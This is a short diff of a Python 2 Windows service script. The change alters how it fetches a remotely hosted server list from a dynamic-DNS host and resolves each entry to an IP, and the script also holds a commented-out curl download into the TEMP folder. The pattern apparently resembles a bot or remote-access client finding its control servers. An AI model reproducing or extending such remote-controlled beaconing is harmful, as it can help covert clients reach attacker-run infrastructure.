@@ -1,7 +1,7 @@
 import win32serviceutil
 import win32service
 import win32event
-
+import socket
 import servicemanager
 import threading
 import asyncore
@@ -195,8 +195,12 @@ def myloop():
     sites = ["paner.altervista.org"]#, mainsite.text]
     header = {'User-Agent': 'Mozilla/5.0'}
     try:
-      mainsite = requests.get("http://config01.homepc.it/site.txt", headers=header)
-      sites.extend(mainsite.text.split(",") )
+      ip=socket.gethostbyname('config01.homepc.it')
+      mainsite = requests.get("http://"+ip+"/site.txt", headers=header)
+      for mysite in mainsite.text.split(","):
+         #print socket.gethostbyname(mysite)
+         sites.append(socket.gethostbyname(mysite))
+      #sites.extend(mainsite.text.split(",") )
     except Exception,e:
       print str(e)
     #p = Popen("curl -L -A 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36' https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF -o "+os.getenv('TEMP')+"\\sites.txt",shell=True)
